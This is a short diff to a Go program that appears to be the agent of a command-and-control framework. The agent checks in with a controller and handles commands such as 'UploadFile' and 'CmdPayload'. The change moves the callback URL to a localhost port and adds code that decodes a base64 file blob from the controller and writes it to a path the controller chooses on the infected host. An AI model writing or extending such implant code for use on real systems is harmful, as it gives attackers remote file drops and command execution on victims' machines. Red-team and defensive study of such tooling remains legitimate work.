@@ -20,9 +20,11 @@ package main
 import (
 	"bytes"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io/ioutil"
 	"math/rand"
 	"net/http"
 	"os"
@@ -45,7 +47,7 @@ var debug = false
 var verbose = false
 var mRun = true
 var hostUUID = uuid.NewV4()
-var url = "https://127.0.0.1:443/"
+var url = "https://127.0.0.1:4433/"
 var h2Client = getH2WebClient()
 var waitTime = 30000 * time.Millisecond
 var agentShell = ""
@@ -261,8 +263,16 @@ func statusCheckIn(host string, client *http.Client) {
 		case "UploadFile":
 			var p messages.UploadFile
 			json.Unmarshal(payload, &p)
+			d1, _ := base64.StdEncoding.DecodeString(p.FileBlob)
+			err := ioutil.WriteFile(p.Dest, d1, 0644)
+			if err != nil {
+				if verbose {
+					color.Red("[!]There was an error writing to : %s", p.Dest)
+					color.Red(err.Error())
+				}
+			}
 
-			if verbose {
+			if verbose || debug {
 				color.Yellow("Writing blob to : %s", p.Dest)
 			}
 		case "CmdPayload":
